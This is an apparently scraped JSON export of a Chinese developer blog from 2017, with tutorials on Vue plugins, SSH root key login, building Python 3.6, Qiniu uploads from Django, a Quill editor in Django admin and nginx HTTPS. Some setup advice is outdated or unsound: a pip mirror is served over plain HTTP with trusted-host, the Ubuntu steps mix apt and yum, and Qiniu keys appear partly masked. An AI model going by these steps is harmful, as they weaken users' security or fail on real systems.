fastclick```在根目录的src/main.js中``` jsimport fastclick from &#x27;fastclick&#x27;fastclick.attach(document.body) 使用 lazyload 图片懒加载lazyload可以延迟加载长页面中的图片。在浏览器可视区域外的图片在初始状态下不会被载入，直到用户将页面滚动到它们所在的位置。 npm安装 1234567npm install --save lazyload`````` jsimport VueLazyload from &#x27;vue-lazyload&#x27;Vue.use(VueLazyload, &#123; loading: require(&#x27;@/common/images/defalut.png&#x27;)&#125;) 然后在需要懒加载的&lt;img&gt;加上v-lazy属性即可。 1&lt;img v-lazy=&quot;图片url&quot;&gt;","categories":[],"tags":[{"name":"vue","slug":"vue","permalink":"https://blog.zhengxiangling.com/tags/vue/"},{"name":"fastclick","slug":"fastclick","permalink":"https://blog.zhengxiangling.com/tags/fastclick/"},{"name":"lazyload","slug":"lazyload","permalink":"https://blog.zhengxiangling.com/tags/lazyload/"}],"author":"Elijah Zheng"},{"title":"ssh 连接远程服务器","slug":"https部署","date":"2017-09-06T11:29:00.000Z","updated":"2023-11-17T14:27:30.005Z","comments":true,"path":"2017/09/06/https部署/","link":"","permalink":"https://blog.zhengxiangling.com/2017/09/06/https%E9%83%A8%E7%BD%B2/","excerpt":"登上远程服务器，除了使用登录密码之外，我们还可以使用公钥key来免手动输入密码进行登录。","text":"登上远程服务器，除了使用登录密码之外，我们还可以使用公钥key来免手动输入密码进行登录。 这里使用linux服务器，默认启用root账户。 先在远程服务器操作 1.启用root权限用户 1sudo -i 2.新建存放公钥的.ssh文件夹和放公钥文件 1234cd ~mkdir .sshcd .sshvim authorized_keys 按a，然后输入你的公钥id_rsa.pub，完成后按esc : w q保存退出 3.本地连接远程服务器 在本地电脑 12cd ~/.sshvim config 添加 12345Host remote HostName 远程服务器的ip Port 22 User root ServerAliveInterval 60 esc : w q 保存退出 然后就可以用 1ssh root@remote 直接访问远程服务器了。","categories":[],"tags":[{"name":"ssh","slug":"ssh","permalink":"https://blog.zhengxiangling.com/tags/ssh/"},{"name":"服务器","slug":"服务器","permalink":"https://blog.zhengxiangling.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"author":"给你灵感奶昔"},{"title":"linux 安装 python3.6 及 使用 Virtualenv 管理python版本","slug":"linux-安装-pyhton3-6-及-使用-Virtualenv-管理python版本","date":"2017-08-27T06:59:00.000Z","updated":"2023-11-17T14:27:30.005Z","comments":true,"path":"2017/08/27/linux-安装-pyhton3-6-及-使用-Virtualenv-管理python版本/","link":"","permalink":"https://blog.zhengxiangling.com/2017/08/27/linux-%E5%AE%89%E8%A3%85-pyhton3-6-%E5%8F%8A-%E4%BD%BF%E7%94%A8-Virtualenv-%E7%AE%A1%E7%90%86python%E7%89%88%E6%9C%AC/","excerpt":"购买的云服务器装机的linux会自带python2.7和python3的版本，但是python3一般都不是最新版本的，所以想升级到最新版本，还得手动升级。文章主要讲怎么安装python3.6版本，使用Virtualenv管理python版本，使用豆瓣镜像的pip提速pip下载，以及一些安装时会遇到的bug。","text":"购买的云服务器装机的linux会自带python2.7和python3的版本，但是python3一般都不是最新版本的，所以想升级到最新版本，还得手动升级。文章主要讲怎么安装python3.6版本，使用Virtualenv管理python版本，使用豆瓣镜像的pip提速pip下载，以及一些安装时会遇到的bug。 1.安装必要的依赖 123456sudo apt-get updateapt-get install yumyum -y groupinstall developmentyum -y install zlib-develyum -y install sqlite-develapt-get install make 2.安装 gcc、make 和 zlib 压缩&#x2F;解压缩库： 1aptitude -y install gcc make zlib1g-dev 3.安装python3.6 123456//已经cdn加速 wget https://cdn.zhengxiangling.com/Python-3.6.2.tar.xz tar xJf Python-3.6.2.tar.xz cd Python-3.6.2 ./configure --with-ssl make &amp;&amp; make altinstall --with-ssl 是为了给 python3 增加 ssl模块 4.查看python3的版本 1python3 -V 5.配置pip，使用豆瓣镜像加速下载 12cd ~/.pipvim pip.conf 然后在pip.conf中添加内容， 按 a 然后添加 123[global]trusted-host = pypi.douban.comindex-url = http://pypi.douban.com/simple 写好后按wq保存 6.下载virtualenv 123pip install virtualenv//涉及到权限时，使用 sudo 执行sudo pip install virtualenv 7.创建python虚拟环境 上面安装的python3.6的文件夹路径默认是在 /usr/python3中 123//进到用到存放虚拟环境文件夹的路径，一般放在 ~ 中cd ~virtualenv -p /usr/local/bin/python3.6 env3.6 8.激活virtualenv 12cd env3.6source ./bin/activate 这样就可以激活 virtualenv了 如果在其他文件夹操作时，想激活虚拟环境，也可以执行 1source ~/env3.6/bin/activate 来进行激活 9.关闭virtualenv 1deactivate","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://blog.zhengxiangling.com/tags/python/"},{"name":"linux","slug":"linux","permalink":"https://blog.zhengxiangling.com/tags/linux/"}],"author":"Elijah Zheng"},{"title":"Django 运用 七牛云 作为图床上传图片","slug":"Django-上传七牛图片","date":"2017-08-25T14:40:00.000Z","updated":"2023-11-17T14:27:30.002Z","comments":true,"path":"2017/08/25/Django-上传七牛图片/","link":"","permalink":"https://blog.zhengxiangling.com/2017/08/25/Django-%E4%B8%8A%E4%BC%A0%E4%B8%83%E7%89%9B%E5%9B%BE%E7%89%87/","excerpt":"用 七牛云 作为图床，是一个不错的选择，有一定免费量的存储空间。本文介绍怎么使用 七牛云 来存储图片。","text":"用 七牛云 作为图床，是一个不错的选择，有一定免费量的存储空间。本文介绍怎么使用 七牛云 来存储图片。 1.注册七牛云个人账户选择个人账户 2.创建存储空间注册成功在资源主页 点击对象存储 –&gt;立即添加，存储名称 （按自己喜好），这里为了后面方便先起名为chuangyi（创意），存储区域默认，访问空间选择公开空间。–&gt; 确定创建 3.获取有用的信息。1）秘钥左边栏，进入个人中心，点击秘钥管理，然后会有公钥和密钥。 |AccessKey|SecretKey|: ————- :|:————-:||AK:a40Z71LFfbz_kDJnfOJflyI**|SK:JnfOJflyIOYpMy6eOnXMbsP**| 这里的公钥和密钥后面会有用。2）测试域名 找到存储空间列表，点击chuangyi，空间概览里右边有测试域名。 我这里是 opjb0b***.bkt.clouddn.com 每个人的都会不一样。 4.在django项目中引入七牛。在有 manager.py的目录下，执行 1pip install qiniu 或 1easy_install qiniu ps：如果受权限限制就用sudo执行。 5.配置七牛1)在cyzc的settings.py中 123456import qiniuqn = qiniu.Auth( &#x27;a40Z71LFfbz_kDJnfOJflyI**&#x27;, &#x27;JnfOJflyIOYpMy6eOnXMbsP**&#x27;) （说明：Auth中填入的是之前说的公钥和秘钥。每个人的公钥和密钥都不一样，请自行替换） 2）运用七牛 从views.py中传token值到页面中。 引入qn views.py 1234567from cyzc.settings import qndef qn_test(request): data = &#123; &#x27;upload_token&#x27;: qn.upload_token(&quot;chuangyi&quot;) &#125; return data 将token值返回给html，因为用七牛上传图片时需要上传的权限，这个token值就是上传时需要的证明。其中upload_token()中的值为对应的七牛上面创建的存储空间的名字。 3）在html页面给input绑定这个token值 123456&#123;% if upload_token %&#125;&lt;form id=&quot;qn&quot; method=&quot;post&quot; action=&quot;http://upload.qiniu.com/&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input name=&quot;token&quot; type=&quot;hidden&quot; value=&quot;&#123;&#123; upload_token &#125;&#125;&quot;&gt; &lt;input id=&quot;qnUpload&quot; name=&quot;file&quot; type=&quot;file&quot; accept=&quot;image/*&quot; style=&quot;display: none&quot;&gt;&lt;/form&gt;&#123;% endif %&#125; 这个直接复制粘贴就可以了。 4）给需要上传图片的按钮增加class&#x3D;”upload-btn” 我们需要用到的是先创建一个隐藏的input，其中name对应着要上传的字段的名字。 1&lt;input type=&quot;hidden&quot; class=&quot;my_upload&quot; name=&quot;img&quot;&gt; 5）然后给按钮绑定一个点击事件。 123$(&#x27;.upload-btn&#x27;).click(function () &#123; $(&#x27;#qnUpload&#x27;).click();&#125;); 其中upload-btn 为点击按钮的class名，qnUpload 为隐藏的七牛上传文件的input的Id名。就相当于点击自定义按钮，实际上触发的是七牛的input的上传按钮。 6）当上传图片时，触发change事件。 123456789101112131415$(&#x27;#qnUpload&#x27;).change(function() &#123; if (this.value) &#123; $.ajax(&#123; url: &#x27;http://up-z2.qiniu.com/&#x27;, type: &#x27;POST&#x27;, data: new FormData($(&#x27;#qn&#x27;)[0]), cache: false, contentType: false, processData: false &#125;).done(function(data) &#123; var img_src = &#x27;http://opjb0b**.bkt.clouddn.com/&#x27; + data.hash; $(&quot;.my_upload&quot;).val(img_src); &#125;); &#125;&#125;) 这里的也直接复制就好。（也可以自行修改class或id属性值）。 123done(function(data) &#123;&#125;) data为上传成功时返回的图片数据，data.hash则为图片的名称。 7）然后我们可以直接获取上传成功的图片路径然后渲染在html页面上。图片的路径为 1var img_src = &#x27;http://opjb0***.bkt.clouddn.com/&#x27; + data.hash; 其中http://~~为之前说的测试域名（ps：拼接路径名时别忘记了 ‘&#x2F;‘ ）。 6. 需要上传的字段的信息，已经存储在input的value里了，post的时候就可以获取到图片的路径，然后就可以存储到数据库中了。","categories":[],"tags":[{"name":"Django","slug":"Django","permalink":"https://blog.zhengxiangling.com/tags/Django/"}],"author":"Elijah Zheng"},{"title":"Django Admin 使用富文本插件 Quill 定制后台","slug":"Django-Admin-使用-Quill-定制后台","date":"2017-08-25T09:22:00.000Z","updated":"2023-11-17T14:27:30.001Z","comments":true,"path":"2017/08/25/Django-Admin-使用-Quill-定制后台/","link":"","permalink":"https://blog.zhengxiangling.com/2017/08/25/Django-Admin-%E4%BD%BF%E7%94%A8-Quill-%E5%AE%9A%E5%88%B6%E5%90%8E%E5%8F%B0/","excerpt":"为什么选择 Quill自从网站的出现，内容创作已经成为了核心。文本域textarea对几乎所有的网站应用提供了一个基础的解决方法。但是在某些情况下你可能需要对文本输入做一些格式设置。这就出现了富文本编辑器。现在拥有很多的解决途径，但是 Quill 会给你一些 Modern Ideas 来考虑去使用它。","text":"为什么选择 Quill自从网站的出现，内容创作已经成为了核心。文本域textarea对几乎所有的网站应用提供了一个基础的解决方法。但是在某些情况下你可能需要对文本输入做一些格式设置。这就出现了富文本编辑器。现在拥有很多的解决途径，但是 Quill 会给你一些 Modern Ideas 来考虑去使用它。 图例 在admin.py中注册你需要增加富文本插件的表12345678910111213141516171819from django.contrib import adminfrom app import models@admin.register(models.YourTable)class YourTableAdmin(admin.ModelAdmin): search_fields = (&#x27;name&#x27;, &#x27;desc&#x27;, &#x27;type__name&#x27;) list_display = (&#x27;name&#x27;, &#x27;desc&#x27;, &#x27;type&#x27;) ordering = (&#x27;-id&#x27;, ) class Media: js = ( &#x27;http://cdn.quilljs.com/1.2.4/quill.min.js&#x27;, &#x27;静态路径/my_admin.js&#x27;, ) css = &#123; &#x27;all&#x27;: ( &#x27;http://cdn.quilljs.com/1.2.4/quill.snow.css&#x27;, ) &#125; | 要点 | 解释|: ————- :|:————-:|| @admin.register() | 括号里填你要运用富文本的数据表 || search_fields| 加入搜索功能，括号里填表中拥有的字段，搜索内容会从填入字段中进行查询 || list_display | 填入表中拥有的字段，定义在admin中显示的字段信息 || ordering | 排序关键字，-id代表按id倒序排列，也就是最新的会排在上面 || class Media | 引入外部资源，引入我们需要用到的Quill的css和js文件，其中 静态路径&#x2F;my_admin.js是我们自己新建的js文件，用来自定义Quill所需要的样式 | 在my_admin.js 中定义Quill样式及富文本要显示的位置123456789101112131415161718192021222324252627282930313233343536373839django.jQuery(function() &#123; var $ = django.jQuery $(&#x27;#id_desc&#x27;).css(&#123; &#x27;opacity&#x27;: &#x27;0&#x27;, &#x27;height&#x27;: &#x27;1em&#x27;, &#125;).after(&#x27;&lt;div id=&quot;descEditor&quot; style=&quot;height: 600px&quot;&gt;&lt;/div&gt;&#x27;) var toolbarOptions = [ [&#x27;bold&#x27;, &#x27;italic&#x27;, &#x27;underline&#x27;, &#x27;strike&#x27;], // toggled buttons [&#x27;blockquote&#x27;, &#x27;code-block&#x27;], [&#123; &#x27;list&#x27;: &#x27;ordered&#x27; &#125;, &#123; &#x27;list&#x27;: &#x27;bullet&#x27; &#125;], [&#123; &#x27;indent&#x27;: &#x27;-1&#x27; &#125;, &#123; &#x27;indent&#x27;: &#x27;+1&#x27; &#125;], // outdent/indent [&#123; &#x27;header&#x27;: [1, 2, 3, 4, 5, 6, false] &#125;], [&#123; &#x27;color&#x27;: [] &#125;], // dropdown with defaults from theme [&#123; &#x27;font&#x27;: [] &#125;], [&#123; &#x27;align&#x27;: [] &#125;], [&#x27;clean&#x27;], // remove formatting button [&#x27;image&#x27;] ] var editor = new Quill(&#x27;#descEditor&#x27;, &#123; modules: &#123; toolbar: &#123; container: toolbarOptions, &#125; &#125;, theme: &#x27;snow&#x27;, &#125;); var $textarea = document.querySelector(&#x27;#id_desc&#x27;) editor.on(&#x27;text-change&#x27;, function(delta, oldDelta, source) &#123; $textarea.value = editor.root.innerHTML &#125;) editor.root.innerHTML = $textarea.value&#125;) 要点 解释 var $ &#x3D; django.jQuery Django自带jquery，赋值给$比较符合平常使用规范 $(‘#id_desc’) 选中需要运用富文本元素的id（id为admin自己生成），所有id需要自行修改 id&#x3D;”descEditor” id&#x3D;”descEditor”为需要插入的富文本插件的id，可自行修改 editor.on(‘text-change’) 官方api，当富文本的内容改变时，调用该接口 editor.on()的作用是，将富文本编辑好的源代码保存在原来的textarea中，这样点击保存修改时才会将富文本的源代码存回到数据库中。 点击上传图片按钮时，将图片保存到 七牛云首先，我们要获取token值 token值是什么，可以参考我的文章 – DJANGO 运用 七牛云 作为图床上传图片定义获取token值的api urls.py 1url(r&#x27;^api/qntoken$&#x27;, views.api_qn_token), views.py中 123456def api_qn_token(request): data = &#123; &#x27;qntoken&#x27;: qn.upload_token(&#x27;对象存储名&#x27;) &#125; return HttpResponse(json.dumps(data), content_type=&#x27;application/json&#x27;) 然后再my_admin.js中增加 123456789101112131415161718192021222324252627282930313233343536373839django.jQuery(function() &#123; var $ = django.jQuery ... var editor = new Quill(&#x27;#descEditor&#x27;, &#123; modules: &#123; toolbar: &#123; container: toolbarOptions, handlers: &#123; image: function() &#123; $(&#x27;#qnUpload&#x27;).click() &#125; &#125; &#125; &#125;, theme: &#x27;snow&#x27;, &#125;); $.get(&#x27;/api/qntoken&#x27;, function(data)&#123; $(&#x27;body&#x27;).append(&#x27;&lt;form id=&quot;qn&quot; method=&quot;post&quot; action=&quot;http://upload.qiniu.com/&quot; enctype=&quot;multipart/form-data&quot;&gt;&#x27; + &#x27;&lt;input name=&quot;token&quot; type=&quot;hidden&quot; value=&quot;&#x27;+ data.qntoken +&#x27;&quot;&gt;&#x27; + &#x27;&lt;input id=&quot;qnUpload&quot; name=&quot;file&quot; type=&quot;file&quot; style=&quot;display: none&quot;/&gt;&#x27; + &#x27;&lt;/form&gt;&#x27;) $(&#x27;#qnUpload&#x27;).change(function()&#123; $.ajax(&#123; url: &#x27;http://up-z2.qiniu.com/&#x27;, type: &#x27;POST&#x27;, data: new FormData($(&#x27;#qn&#x27;)[0]), cache: false, contentType: false, processData: false, &#125;).done(function( data ) &#123; var imgSrc = &#x27;http://ov8c***.bkt.clouddn.com/&#x27; + data.hash var range = editor.getSelection(); editor.insertEmbed(range.index, &#x27;image&#x27;, imgSrc, Quill.sources.USER); &#125;); &#125;) &#125;)&#125;) 点击图片按钮，就可以将图片上传到 七牛云 了。 到此，富文本插件就完成了。","categories":[{"name":"爬坑","slug":"爬坑","permalink":"https://blog.zhengxiangling.com/categories/%E7%88%AC%E5%9D%91/"}],"tags":[{"name":"Django","slug":"Django","permalink":"https://blog.zhengxiangling.com/tags/Django/"}],"author":"Elijah Zheng"},{"title":"http到https 并用cdn加速资源","slug":"http到https-并用cdn加速资源","date":"2017-08-03T05:18:00.000Z","updated":"2023-11-17T14:27:30.005Z","comments":true,"path":"2017/08/03/http到https-并用cdn加速资源/","link":"","permalink":"https://blog.zhengxiangling.com/2017/08/03/http%E5%88%B0https-%E5%B9%B6%E7%94%A8cdn%E5%8A%A0%E9%80%9F%E8%B5%84%E6%BA%90/","excerpt":"为什么要用httpshttps协议的主要作用可以分为两种：一种是建立一个信息安全通道，来保证数据传输的安全；另一种就是确认网站的真实性。","text":"为什么要用httpshttps协议的主要作用可以分为两种：一种是建立一个信息安全通道，来保证数据传输的安全；另一种就是确认网站的真实性。 选择ssl证书有付费的和免费的。列举两个提供免费的证书，Let’s Encrypt 和 现在限免的TrustAsia（文章写于2017.08.03）。 1.Let’s Encrypt 这个免费、自动化、开放的证书签发服务。Let’s Encrypt 得到了 Mozilla、Cisco、Akamai、Electronic Frontier Foundation 和 Chrome 等众多公司和机构的支持，发展十分迅猛。证书有效期为90天，但可以通过脚本定期更新。 使用 Let’s Encrypt 的请参考QuQu大佬的 Let’s Encrypt，免费好用的 HTTPS 证书 https://imququ.com/post/letsencrypt-certificate.html ps: 选择 Let’s Encrypt 的请跳过下面购买证书和使用证书的步骤，因为QuQu大佬已经很详细的说明了 Let’s Encrypt 的使用和配置了。 2.亚洲诚信（TrustAsia®）是亚数信息科技（上海）有限公司应用于信息安全领域的品牌。可以通过七牛云免费申请，证书有效期一年（博主懒人癌犯了，所以选择了这个，- -） 我的博客 用的TrustAsia，申请流程 注册登录 &gt; 七牛云 然后点击 SSL证书服务 &gt; 购买证书 附链接：https://portal.qiniu.com/certificate/apply 填写信息 信息自己填写，其中需要注意的有域名所有权验证方式： 域名所有权验证方式有两种： DNS验证 ：DNS验证需要到自己的域名管理里添加TXT验证。 文件验证：在文件夹中添加文件&#x2F;.well-known&#x2F;pki-validation&#x2F;fileauth.txt，验证文件值由证书提供。 两种方式二选一。 填完信息就是到域名所有权验证方式了，完成验证操作之后，需要等待差不多几分钟的时间就可以看到订单状态是已签发了，这时我们就拿到证书了。 使用ssl证书点击 证书管理 &gt; 我的证书，将刚才申请到的证书下载到本地，将文件更名为my_cert(也可以换成自己喜欢的)。 我的系统用的是 Ubuntu 14.04.1 ，代理用的是nginx，nginx目录文件为 /etc/nginx （这里未提供其他代理的配置）。 在 /etc/nginx 新建目录 cert 用于存放证书，然后放入刚才下载并更名好的文件夹my_cert 然后配置代理 1234567891011121314151617181920212223server &#123; server_name 你的域名; listen 443; ssl on; ssl_certificate /etc/nginx/cert/my_cert/你下载的文件名.crt; ssl_certificate_key /etc/nginx/cert/my_cert/你下载的文件名.key; location / &#123; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://127.0.0.1:port; &#125; access_log /var/log/nginx/blog.access_log; error_log /var/log/nginx/blog.error_log;&#125;server &#123; listen 80; client_max_body_size 50m; server_name 你的域名; rewrite ^(.*) https://$server_name$1 permanent;&#125; https用的是443端口，ssl_certificate及ssl_certificate_key填的是存放证书的路径 123456server &#123; listen 80; client_max_body_size 50m; server_name 你的域名; rewrite ^(.*) https://$server_name$1 permanent;&#125; 的作用是将http转向https。 这时访问你的域名就会被添加https了。 使用cdn加速资源让站点飞起来~ 首先使用cdn加速的话，我们可以重新申请一个证书，专门存放需要加速的资源的。 比如我申请了一个cdn.zhengxiangling.com的ssl证书，因为只是存放加速资源，所以就不用下载证书然后在nginx配置了。 同样以七牛云举例，点击 资源主页 &gt; 立即添加 融合 CDN 加速 （首先得实名和冲10元才能使用该功能 -） 为了加速，去吧，10元（皮卡丘） 然后填写信息， 有证书了当然选择https通信协议啦 源站配置就自己新建一个对象存储，（点击 资源主页 &gt; 立即添加 对象存储） 其他信息按自己喜好而外自己选 选好之后点击创建，创建过程需要等待一小段时间，具体多长时间说不准。 创建完成之后需要进入下一步，配置CNAME 配置完成之后也需要等待一段时间，正确配置之后就会显示发布成功啦~ 然后就可以在之前创建的对象存储中上传需要加速的资源了 然后修改默认域名，改成自己的域名 点击小眼睛就可以查看加速资源的路径了，就可以拿到需要引用的地方引用加速资源了 使用极简图床绑定七牛云上传图片极简图床支持截图粘贴、拖拽图片上传，其中截图粘贴上传时我最喜欢的一点原因，同时支持Chrome插件。 使用方式很简单，点击注册登录， 点击右上角的设置按钮 然后配置 空间名称，AK，SK，和域名即可。","categories":[{"name":"服务器","slug":"服务器","permalink":"https://blog.zhengxiangling.com/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"https","slug":"https","permalink":"https://blog.zhengxiangling.com/tags/https/"}],"author":"Elijah Zheng"},{"title":"CSS-Sticky-Footer 布局","slug":"CSS-Sticky-Footer布局","date":"2017-07-27T14:32:00.000Z","updated":"2023-11-17T14:27:30.000Z","comments":true,"path":"2017/07/27/CSS-Sticky-Footer布局/","link":"","permalink":"https://blog.zhengxiangling.com/2017/07/27/CSS-Sticky-Footer%E5%B8%83%E5%B1%80/","excerpt":"这个布局是用来实现，让底部信息（例如版权）始终保持在页面最底部的效果。","text":"这个布局是用来实现，让底部信息（例如版权）始终保持在页面最底部的效果。 类似于下面图片的效果，让关闭按钮始终保持在最底部。 代码： 123456&lt;!-- body --&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;content&quot;&gt;content&lt;/div&gt; &lt;div class=&quot;push&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;footer&quot;&gt;footer&lt;/div&gt; container的负底部外边距与footer和push的高度相同。push的作用是将footer推下去，否则content内容太多时会与footer重叠。 1234567891011121314151617181920&lt;style&gt;* &#123; margin: 0;&#125;html,body &#123; height: 100%;&#125;.container &#123; min-height: 100%; margin: 0 auto -100px;&#125;.footer,.push &#123; height: 100px;&#125;&lt;/style&gt;","categories":[{"name":"CSS","slug":"CSS","permalink":"https://blog.zhengxiangling.com/categories/CSS/"}],"tags":[{"name":"CSS布局","slug":"CSS布局","permalink":"https://blog.zhengxiangling.com/tags/CSS%E5%B8%83%E5%B1%80/"}],"author":"给你灵感奶昔"},{"title":"vue-cli脚手架使用（二）-- vue-resource数据请求、引用公共css文件","slug":"vue-cli脚手架使用（二）-vue-resource数据请求、引用公共css文件","date":"2017-07-27T04:39:00.000Z","updated":"2023-11-17T14:27:30.007Z","comments":true,"path":"2017/07/27/vue-cli脚手架使用（二）-vue-resource数据请求、引用公共css文件/","link":"","permalink":"https://blog.zhengxiangling.com/2017/07/27/vue-cli%E8%84%9A%E6%89%8B%E6%9E%B6%E4%BD%BF%E7%94%A8%EF%BC%88%E4%BA%8C%EF%BC%89-vue-resource%E6%95%B0%E6%8D%AE%E8%AF%B7%E6%B1%82%E3%80%81%E5%BC%95%E7%94%A8%E5%85%AC%E5%85%B1css%E6%96%87%E4%BB%B6/","excerpt":"vue与后台请求数据有自己的请求方式，这里用的是vue-resource。当写有公共css时，可以引用@import到组件中使用。 vue-resource安装.$ npm install vue-resource","text":"vue与后台请求数据有自己的请求方式，这里用的是vue-resource。当写有公共css时，可以引用@import到组件中使用。 vue-resource安装.$ npm install vue-resource 引用src&#x2F;main.js 12345import Vue from &#x27;vue&#x27;import App from &#x27;./App&#x27;import router from &#x27;./router&#x27;// 引用vue-resourceimport VueResource from &#x27;vue-resource&#x27; 注册123456import router from &#x27;./router&#x27;// 引用vue-resourceimport VueResource from &#x27;vue-resource&#x27;// 注册Vue.use(VueResource) 请求数据官方给的例子 1234567891011&#123; // GET /someUrl this.$http.get(&#x27;/someUrl&#x27;).then(response =&gt; &#123; // get body data this.someData = response.body; &#125;, response =&gt; &#123; // error callback &#125;);&#125; error callback 可以不写 App.vue 123456789101112export default &#123; data () &#123; return &#123; my_value: &#123;&#125; &#125; &#125;, created () &#123; this.$http.get(url).then(response =&gt; &#123; this.my_value = response.body.data &#125;) &#125;&#125; 调用created钩子，当created时就请求数据。 response.body.data 返回的是一个对象 用my_value来接收数据。 将父组件值传递给子组件 如父组件有一个子组件 &lt;v-header&gt;&lt;/v-header&gt; 用v-bind将值传递给子组件 &lt;v-header v-bind:my_value=&quot;my_value&quot;&gt;&lt;/v-header&gt; (v-bind:my_value可以缩写为 :my_value) 子组件要用props来接受值的传递 12345678910export default &#123; data() &#123; return &#123;&#125; &#125;, props: &#123; my_value: &#123; type: Object &#125; &#125;&#125; 就可以和data里面的数据一样用 大胡子语法 来使用了。 引用公共css文件如有 common&#x2F;scss&#x2F;common.scss 文件 引用方式 （@import） 1234&lt;style lang=&quot;scss&quot; rel=&quot;stylesheet/scss&quot;&gt; @import &quot;..路径/common/scss/common.scss&quot;; ...&lt;/style&gt;","categories":[{"name":"爬坑","slug":"爬坑","permalink":"https://blog.zhengxiangling.com/categories/%E7%88%AC%E5%9D%91/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://blog.zhengxiangling.com/tags/vue/"},{"name":"scss","slug":"scss","permalink":"https://blog.zhengxiangling.com/tags/scss/"}],"author":"给你灵感奶昔"},{"title":"vue-cli脚手架使用（一）-- 起步、组件、路由","slug":"vue-cli脚手架使用（一）","date":"2017-07-25T05:23:00.000Z","updated":"2023-11-17T14:27:30.007Z","comments":true,"path":"2017/07/25/vue-cli脚手架使用（一）/","link":"","permalink":"https://blog.zhengxiangling.com/2017/07/25/vue-cli%E8%84%9A%E6%89%8B%E6%9E%B6%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"使用vue-cli脚手架之前，建议对vue有一定了解之后再使用构建工具。 起步123456789# 全局安装 vue-cli$ npm install --global vue-cli# 创建一个基于 webpack 模板的新项目$ vue init webpack my-project# 安装依赖，走你$ cd my-project$ npm install$ npm run dev","text":"使用vue-cli脚手架之前，建议对vue有一定了解之后再使用构建工具。 起步123456789# 全局安装 vue-cli$ npm install --global vue-cli# 创建一个基于 webpack 模板的新项目$ vue init webpack my-project# 安装依赖，走你$ cd my-project$ npm install$ npm run dev vue init webpack my-project执行完 vue init webpack my-project之后会有下列提示 其中ESlint为js代码规范检测，不符合代码规范的会直接报错，而不是警告。 Karma + Mocha + e2e 都是测试工具，用不到可以不用安装。 脚手架中npm run 分两种模式，一种dev开发模式，另一种bulid生产模式 npm install之后玩之后的文件夹目录结构 其中 config index.js 有修改npm run dev 的端口号 (port). src components放vue模板 router里index.js为路由的相关配置 App.vue 为主 .vue main.js 为主 .js配置 根目录 index.html为html主入口 .vue 中使用css预处理器例如安装sass 法一：找到根路径的package.json 12345&quot;dependencies&quot;: &#123; ... &quot;sass-loader&quot;: &quot;^6.0.6&quot;, ... &#125; 找到dependencies加入&quot;sass-loader&quot;: &quot;^6.0.6&quot;， ^代表版本大于等于所填版本号。 然后执行 $ npm install 法二： npm install sass-loader --save 然后就可以在 .vue中使用sass了 123&lt;style lang=&quot;scss&quot; rel=&quot;stylesheet/scss&quot;&gt; h1 &#123; color: #666 &#125; &lt;/style&gt; 使用组件在components中新建header文件夹，里面新建header.vue文件 12345678910111213&lt;template&gt; &lt;div class=&quot;header&quot;&gt; 我是header &lt;/div&gt;&lt;/template&gt;&lt;script type=&quot;text/ecmascript-6&quot;&gt; export default &#123;&#125;&lt;/script&gt;&lt;style lang=&quot;scss&quot; rel=&quot;stylesheet/scss&quot;&gt; &lt;/style&gt; 注意，要在script写export default &#123;&#125;导出该模板 然后在App.vue中引入该组件 1234567891011&lt;script&gt;// 引入 header.vue 组件import Header from &#x27;./components/header/header.vue&#x27;export default &#123; name: &#x27;app&#x27;, // 注册该组件，标签名为 v-header components: &#123; &#x27;v-header&#x27;: Header &#125;&#125;&lt;/script&gt; 然后就可以在template中使用该组件了 123456&lt;template&gt; &lt;div id=&quot;app&quot;&gt; &lt;div class=&quot;header&quot;&gt;I am header&lt;/div&gt; &lt;v-header&gt;&lt;/v-header&gt; &lt;/div&gt;&lt;/template&gt; 使用路由在router中index.js配置路由 123456789101112131415161718import Goods from &#x27;@/components/goods/goods&#x27;import Ratings from &#x27;@/components/ratings/ratings&#x27;Vue.use(Router)export default new Router(&#123; routes: [&#123; path: &#x27;/goods&#x27;, name: &#x27;goods&#x27;, component: Goods &#125;, &#123; path: &#x27;/ratings&#x27;, name: &#x27;ratings&#x27;, component: Ratings &#125; ]&#125;) 其中Goods和Ratings为自己写好的放在components的组件。其中 @代表文件夹根路径，(可以在build&#x2F;webpack.base.conf.js中resolve找到)。 path 表示要注册的网页子链接 name 代表引用链接的别名，当链接很长时，使用name来写router-link时会很方便。 component 代表点击链接时router-view要显示的组件。 然后就可以在App.vue中使用路由了 &#x2F;&#x2F; App.vue中 1234567891011&lt;div class=&quot;tab&quot;&gt; &lt;div class=&quot;tab-item&quot;&gt; &lt;router-link :to=&quot;&#123; name: &#x27;goods&#x27;&#125;&quot;&gt;商品&lt;/router-link&gt; &lt;/div&gt; &lt;div class=&quot;tab-item&quot;&gt; &lt;router-link to=&quot;/ratings&quot;&gt;评论&lt;/router-link&gt; &lt;/div&gt;&lt;/div&gt;&lt;router-view&gt;&lt;/router-view&gt; 1&lt;router-link&gt;&lt;/router-link&gt; 会被渲染成&lt;a&gt;&lt;/a&gt;标签 链接填入有两种方式，直接填入型 to=&quot;/ratings&quot; 为直接链接 :to”{ name&#x3D;’goods’ }” 为取链接name型，name为router中index.js配置好的链接别名 1&lt;router-view&gt;&lt;/router-view&gt; 为点击链接后要显示内容 点击链接时，链接会默认有一个class类名router-link-exact-active，要想点击切换到自己自定义的class类名（方便修改样式），可以在src&#x2F;router&#x2F;index.js中配置 12345678910export default new Router(&#123; routes: [&#123; path: &#x27;/goods&#x27;, name: &#x27;goods&#x27;, component: Goods &#125; ... ], linkActiveClass: &#x27;active&#x27;&#125;) 其中linkActiveClass: 